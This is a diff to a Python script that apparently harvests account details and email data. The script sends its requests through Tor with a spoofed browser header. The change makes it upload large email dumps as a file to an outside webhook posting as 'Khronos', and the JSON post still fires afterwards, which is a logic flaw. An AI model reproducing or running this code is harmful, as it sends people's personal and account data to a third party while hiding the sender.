@@ -8,7 +8,7 @@ print("[%] Setting up TOR")
 session = requests.session()
 proxies = {"http":"socks5h://localhost:9050","https":"socks5h://localhost:9050"}
 session.proxies.update(proxies)
-headers = {"User-Agent":"Mozilla/5.0 (platform; rv:gecko-version) Gecko/gecko-trail Firefox/firefox-version"}
+headers = {"User-Agent":"Mozilla/5.0 (Windows; rv:8.9)"}
 session.headers.update(headers)
 session.cookies.clear()
 
@@ -70,13 +70,21 @@ Created At: {user_info.get('created_at')}
             send_webhook(webhook, user_data, email_data)
 
 def send_webhook(webhook, user_info, email_info):
-    ##  TODO: webhook message too long
     try:
         print("Sending user info...")
         data = { "content": f"```{user_info}```", "username":"Khronos" }
         session.post(webhook, json=data)
         print("Sending email info...")
+        
         data = { "content": f"```{email_info}```", "username":"Khronos" }
+        if len(data["content"]) > 2000:
+            with open("emails.txt", "w") as f:
+                f.write(email_info)
+                f.close()
+            
+            data = { "content": "Message was too large, outputting as file", "username": "Khronos"}
+            session.post(webhook, data=data, files={"file": open("./emails.txt", "rb")})
+
         session.post(webhook, json=data)
     except requests.ConnectionError as e:
         print(e)
